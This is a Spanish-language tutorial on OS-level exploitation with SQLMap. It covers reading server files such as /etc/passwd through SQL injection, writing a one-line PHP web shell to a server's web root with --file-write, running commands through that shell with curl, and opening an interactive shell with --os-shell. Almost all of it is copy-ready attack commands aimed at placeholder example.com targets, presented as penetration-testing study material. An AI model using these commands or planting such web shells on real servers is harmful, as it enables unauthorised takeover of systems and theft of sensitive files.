
# OS Exploitation con SQLMap

SQLMap permite explotar vulnerabilidades de SQL Injection para **leer y escribir archivos en el sistema anfitrión** y, si los privilegios lo permiten, obtener **ejecución de comandos en el sistema operativo**.

## **1. Lectura y escritura de archivos**

### **Lectura de archivos**

Es más común que la escritura, ya que esta última requiere permisos más elevados. En MySQL, leer archivos locales requiere los privilegios `LOAD DATA` e `INSERT`, lo que permite cargar el contenido en una tabla y posteriormente leerlo.

Ejemplo en SQL:

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

Para verificar si el usuario tiene privilegios de DBA:

```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

Si el resultado es `current user is DBA: True`, entonces se pueden leer archivos.

Ejemplo con SQLMap para leer `/etc/passwd`:

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Si la lectura es exitosa, SQLMap guarda el archivo localmente en:

```
~/.sqlmap/output/www.example.com/files/_etc_passwd
```

Se puede visualizar con:

```bash
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

### **Escritura de archivos**

Es más restringida ya que permite escribir **web shells** para tomar el control del servidor. En MySQL, `--secure-file-priv` debe estar deshabilitado y el usuario debe tener permisos de escritura en el directorio destino.

Ejemplo de una web shell en PHP:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Para escribir el archivo en el servidor:

```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Para verificar la ejecución de comandos:

```bash
curl http://www.example.com/shell.php?cmd=ls+-la
```

Si la shell está funcional, devolverá el listado de archivos del directorio.

## **2. Ejecución de comandos en el sistema operativo**

SQLMap puede obtener una shell interactiva sin necesidad de subir una web shell manualmente. Para intentarlo:

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

Si falla, se puede especificar una técnica diferente, como SQLi basada en errores:

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

En el proceso, SQLMap puede:

1. Preguntar por el lenguaje del servidor web (`PHP`, `ASP`, `JSP`, etc.).
2. Intentar encontrar automáticamente el **web root** (directorio donde se almacenan los archivos web).
3. Subir un **backdoor** y proporcionar una shell interactiva.

Cuando se obtiene acceso exitoso, se puede ejecutar comandos:

```bash
os-shell> ls -la
```

Si SQLMap encuentra problemas con la salida de los comandos, se puede probar con `--batch` para automatizar opciones.
